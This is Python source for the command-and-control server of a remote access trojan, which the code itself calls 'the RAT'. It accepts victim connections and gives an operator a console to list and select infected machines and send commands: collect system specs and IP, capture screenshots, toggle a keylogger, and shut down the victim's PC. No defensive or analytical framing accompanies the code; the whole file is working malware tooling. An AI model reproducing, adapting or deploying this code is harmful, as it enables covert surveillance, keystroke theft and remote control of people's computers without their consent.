import traceback
import threading
import base64
import socket
import time
import sys
import os
from threading import Thread

host = '0.0.0.0'
port = 12345


def intToBytes(num):
    return bytes(str(num).rjust(10, '0'), 'utf-8')


def bytesToInt(bytes):
    return int(str(bytes, 'utf-8'))


def writeString(string, conn):
    conn.sendall(intToBytes(len(string)))
    conn.sendall(bytes(string, 'utf-8'))


def readString(conn):
    bytes = conn.recv(10)
    len = bytesToInt(bytes)

    bytes = conn.recv(len)
    return str(bytes, 'utf-8')


class Client:

    def __init__(self, conn, addr, id):
        self.conn = conn
        self.addr = addr
        self.id = id
        self.connected = True
        self.username = ''
        self.commandsToSend = []
        self._lock = threading.Lock()
        self.lastPacketTime = round(time.time() * 1000)
        self.keylogger = False

    def sendCommand(self, cmd):
        self.commandsToSend.append(cmd)

    def lock(self):
        while self._lock.locked():
            time.sleep(0.001)
        self._lock.acquire()

    def unlock(self):
        self._lock.release()

    def timeSinceLastPacket(self):
        return round(time.time() * 1000) - self.lastPacketTime

    def hasTimedOut(self):
        return self.timeSinceLastPacket() > 5000

    def isConnected(self):
        if self.connected:
            self.connected = not self.hasTimedOut()
        return self.connected

    def startReading(self):
        try:
            while self.isConnected():
                res = readString(self.conn)
                self.lastPacketTime = round(time.time() * 1000)
                if res != 'keepalive':
                    if res.startswith('screenshot:'):
                        print(f'[{self.username}] Screenshot Response: {len(res) -11}')
                        img_data = base64.b64decode(res[11:])
                        with open('screenshot.jpeg', 'wb') as f:
                            f.write(img_data)
                    else:
                        print(f'[{self.username}] Response: {res}')
                else:
                    # print('keepalive :)')
                    self.sendCommand(res)
        except:
            pass
        self.connected = False

    def disconnectedThread(self):
        global selected_client, selected_client_id
        while self.isConnected():
            time.sleep(0.5)
        print(f'[{self.username}] Client disconnected')
        if self == selected_client:
            clients[selected_client_id] = None
            selected_client_id = 0
            selected_client = None

    def processClient(self):
        try:
            self.conn.settimeout(2)
            with self.conn:
                print(f'[{self.id}] Connection: {self.addr}')

                self.username = readString(self.conn)
                print(f'[{self.username}] Client connected')

                readThread = Thread(target=self.startReading)
                readThread.start()

                disconnectThread = Thread(target=self.disconnectedThread)
                disconnectThread.start()

                while self.isConnected():
                    if len(self.commandsToSend) > 0:
                        cmd = self.commandsToSend.pop(0)
                        writeString(cmd, self.conn)
                    else:
                        time.sleep(0.25)

                # while True:
                #    string = input('meow meow > ')
                #    writeString(string, self.conn)
                #    if string == 'exit' or string == 'quit':
                #        break
                #    res = readString(self.conn)
                #    print("Response: '" + res + "'")
        except:
            pass
        self.connected = False


# Dictionary of clients (id -> Client,Thread)
clients = {
    0: None
}

# Next client id
client_id = 1

# Currently selected client
selected_client_id = 0  # id
selected_client = None  # client


class Listen:
    def __init__(self):
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def isStopped(self):
        return self._stop_event.is_set()

    def listen(self):
        global selected_client_id
        global selected_client
        try:
            while not self.isStopped():
                if selected_client is not None and selected_client.isConnected():
                    string = input(f'[{selected_client.username}] meow meow > ')  # select 1
                else:
                    string = input('meow meow > ')  # select 1

                print(f"CMD: '{string}'")

                if string == 'list':
                    print('Connected clients: ')
                    for i in range(1, client_id):
                        c = clients[i]
                        if c.isConnected():
                            print(f'\t{c.id} - {c.username}')

                elif string == 'shutdown':
                    os._exit(1)

                elif string == 'help':
                    print('Available Global Commands:')
                    print('- list                                ---     List all connected clients')
                    print('- select <id/username>     ---     Select a client')
                    print('- shutdown                       ---     Stop server')

                    print('Available Client Commands:')
                    print('- specs                             ---     Retrieve pc information from client')
                    print('- screenshot                    ---     Take a screenshot and send it to us')
                    print('- ip                                   ---     Retrieve ip from client')
                    print('- directory                       ---      Retrieve directory of the RAT')
                    print('- keylogger                       ---     Toggle keylogger for client')
                    print('- turn_off                        ---     Turns off client PC')
                    print('- exit / quit                      ---     Tell the client to reconnect')

                elif string.startswith('select '):
                    string = string[7:].strip()
                    if string.isdigit():
                        tmpId = int(string)
                        if tmpId > 0 and tmpId in clients:
                            c = clients[tmpId]
                            if c is not None and c.isConnected():
                                selected_client = c
                                selected_client_id = tmpId
                                print(f'Selected client: "{selected_client_id}"')
                            else:
                                print(f'Client with id {selected_client_id} is not connected anymore')
                        else:
                            print(f'Invalid client id (min: 1, max: {client_id - 1})')
                    elif string.isalnum():
                        for i in range(client_id):
                            c = clients[i]
                            if c is not None and c.isConnected() and c.username == string:
                                selected_client = c
                                selected_client_id = i
                                print(f"Selected client: {c.username}")
                            # else:
                            #     print(f'Client with id {c.username} is not connected anymore')
                                break

                    else:
                        print(f'Invalid id: {string}')

                else:
                    if selected_client is not None:
                        # We have a selected client
                        if not selected_client.isConnected():
                            print('Client is not connected anymore')
                            clients[selected_client_id] = None
                            selected_client_id = 0
                            selected_client = None
                        elif string == 'specs':
                            selected_client.sendCommand(string)
                        elif string == 'screenshot':
                            selected_client.sendCommand(string)
                        elif string == 'ip':
                            selected_client.sendCommand(string)
                        elif string == 'directory':
                            selected_client.sendCommand(string)
                        elif string == 'keylogger':
                            selected_client.sendCommand(string)
                            selected_client.keylogger = not selected_client.keylogger
                            isEnabled = 'enabled' if selected_client.keylogger else 'disabled'
                            print(f'[{selected_client.username}] Keylogger {isEnabled} for client.')
                        elif string == 'turn_off':
                            selected_client.sendCommand(string)
                        elif string == 'exit' or string == 'quit':
                            selected_client.sendCommand(string)
                            print('Client should reconnect')
                            selected_client.connected = False
                            clients[selected_client_id] = None
                            selected_client_id = 0
                            selected_client = None
                        else:
                            print('Invalid command')
                    else:
                        # We don't have a selected client
                        print('Invalid command')

        except:
            traceback.print_exc()
            os._exit(1)


listen = Listen()

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen()
        print(f'Listening on port {port}')

        listenThread = Thread(target=listen.listen)
        listenThread.start()

        while True:
            try:
                conn, addr = s.accept()  # ctrl + break

                client = Client(conn, addr, client_id)

                thread = Thread(target=client.processClient)
                clients[client_id] = client
                client.thread = thread
                thread.start()

                client_id += 1
            except KeyboardInterrupt:
                break
except:
    traceback.print_exc()

print('Exiting')
listen.stop()
os._exit(0)
